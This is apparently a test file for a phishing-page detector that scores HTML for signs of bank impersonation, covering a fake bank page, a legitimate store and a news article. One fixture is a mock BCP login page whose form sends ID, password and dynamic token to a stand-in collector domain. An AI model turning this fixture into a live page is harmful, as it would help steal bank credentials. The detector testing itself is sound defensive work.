import { describe, expect, it } from "vitest";
import { analyzeHtml } from "../src/engine";

// Páginas inventadas. Los dominios de estafa son ficticios (.top, .online,
// .example): no son copias de sitios reales.

const AHORA = Date.parse("2026-11-13T12:00:00Z");
const hace = (dias: number) => new Date(AHORA - dias * 86_400_000).toISOString();

const COPIA_BANCO = `<!doctype html><html><head>
<title>BCP | Banca por Internet</title>
<link rel="icon" href="https://www.viabcp.com/favicon.ico">
</head><body>
<img src="https://www.viabcp.com/logo-bcp.svg" alt="BCP">
<h1>Ingresa a tu Banca por Internet</h1>
<form action="https://recolector-datos.top/guardar.php" method="post">
  <input type="text" name="dni" placeholder="DNI">
  <input type="password" name="clave" placeholder="Clave de internet">
  <input type="text" name="token" placeholder="Clave dinámica">
  <input type="hidden" name="_token" value="abc">
</form>
<a href="https://wa.me/51987654321">Ayuda por WhatsApp</a>
<p>Llámanos al 987 654 321</p>
</body></html>`;

const TIENDA_LEGITIMA = `<!doctype html><html><head><title>Ferretería Los Andes | Mi cuenta</title>
<meta name="description" content="Compra herramientas con envío a todo el Perú.">
<script>var x = "<input type=password>";</script></head><body>
<form action="/ingresar" method="post">
  <input type="email" name="correo" autocomplete="email">
  <input type="password" name="contrasena">
  <input type="hidden" name="csrf_token" value="z">
</form>
<p>Atención: (01) 412 3456 · ventas@ferreteria-losandes.pe</p>
<a href="tel:+51912345678">Llamar</a>
</body></html>`;

const NOTICIA = `<html><head><title>BCP anuncia nuevas agencias en Arequipa</title>
<meta property="og:site_name" content="Diario Ejemplo"></head><body>
<h1>BCP anuncia nuevas agencias</h1>
<img src="https://www.viabcp.com/prensa/foto.jpg">
<form action="https://boletin-proveedor.example/suscribir"><input type="email" name="email" placeholder="Tu correo"></form>
</body></html>`;

describe("análisis del código de una página", () => {
  it("reconoce una copia de banco que manda la clave a otro dominio", () => {
    const r = analyzeHtml({ url: "https://bcp-seguridad.online/ingreso", html: COPIA_BANCO, creado: hace(3), ahora: AHORA });
    expect(r.level).toBe("alto");
    expect(r.brand?.id).toBe("bcp");
    const ids = r.findings.map((f) => f.id);
    expect(ids).toContain("pagina_envia_a_otro");
    expect(ids).toContain("pagina_pide_codigo");
    expect(ids).toContain("pagina_copia_recursos");
    expect(ids).toContain("dominio_nuevo");
    expect(r.datos.enviaA).toEqual(["recolector-datos.top"]);
    expect(r.datos.whatsapp).toEqual(["+51987654321"]);
    expect(r.datos.telefonos).toContain("987 654 321");
    expect(r.datos.diasDominio).toBe(3);
  });

  it("no se fija en campos ocultos como _token", () => {
    const r = analyzeHtml({ url: "https://ferreteria-losandes.pe/cuenta", html: TIENDA_LEGITIMA });
    expect(r.datos.pideCodigo).toBe(false);
  });

  it("no marca una tienda que pide clave en su propio dominio", () => {
    const r = analyzeHtml({ url: "https://ferreteria-losandes.pe/cuenta", html: TIENDA_LEGITIMA, creado: hace(900), ahora: AHORA });
    expect(r.level).toBe("sin_senales");
    expect(r.datos.pideClave).toBe(true);
    expect(r.datos.enviaA).toEqual([]);
    expect(r.datos.telefonos).toEqual(expect.arrayContaining(["(01) 412 3456", "912 345 678"]));
    expect(r.datos.correos).toContain("ventas@ferreteria-losandes.pe");
    expect(r.datos.descripcion).toMatch(/herramientas/);
  });

  it("no lee etiquetas que están dentro de un script", () => {
    const html = `<title>Blog</title><script>document.write('<input type="password">')</script>`;
    expect(analyzeHtml({ url: "https://blog-ejemplo.pe/", html }).datos.pideClave).toBe(false);
  });

  it("no marca una noticia que usa fotos del banco pero no pide datos", () => {
    const r = analyzeHtml({ url: "https://diario-ejemplo.pe/economia/bcp", html: NOTICIA, creado: hace(4000), ahora: AHORA });
    expect(r.level).toBe("sin_senales");
    expect(r.datos.recursosDe).toEqual(["BCP"]);
  });

  it("un dominio nuevo sin nada más queda en sospechoso, no en alto", () => {
    const r = analyzeHtml({ url: "https://panaderia-ejemplo.pe/", html: "<title>Panadería</title>", creado: hace(10), ahora: AHORA });
    expect(r.level).toBe("sospechoso");
  });

  it("la página oficial sale como oficial aunque pida clave", () => {
    const r = analyzeHtml({ url: "https://www.viabcp.com/banca", html: COPIA_BANCO.replace("https://recolector-datos.top/guardar.php", "/ingresar") });
    expect(r.level).toBe("oficial");
  });

  it("guarda el camino del enlace acortado y no cuenta el acortador como salto", () => {
    const r = analyzeHtml({ url: "https://bcp-seguridad.online/ingreso", html: COPIA_BANCO, cadena: ["https://bit.ly/ejemplo", "https://bcp-seguridad.online/ingreso"] });
    expect(r.datos.cadena).toHaveLength(2);
    expect(r.findings.map((f) => f.id)).not.toContain("pagina_muchos_saltos");
  });

  it("marca una página sin https que pide tarjeta", () => {
    const html = `<title>Pago de envío</title><form><input name="numero_tarjeta" placeholder="Número de tarjeta"><input name="cvv"></form>`;
    const r = analyzeHtml({ url: "http://pago-envio-ejemplo.top/pagar", html });
    expect(r.datos.pideTarjeta).toBe(true);
    expect(r.findings.map((f) => f.id)).toContain("pagina_sin_cifrar");
    expect(r.level).not.toBe("sin_senales");
  });

  it("decodifica entidades del título", () => {
    const r = analyzeHtml({ url: "https://ejemplo.pe/", html: "<title>Caf&eacute; &amp; T&#233;</title>" });
    expect(r.datos.titulo).toBe("Café & Té");
  });

  it("ignora direcciones que no son web", () => {
    expect(analyzeHtml({ url: "chrome://settings", html: "" }).level).toBe("no_aplica");
  });
});
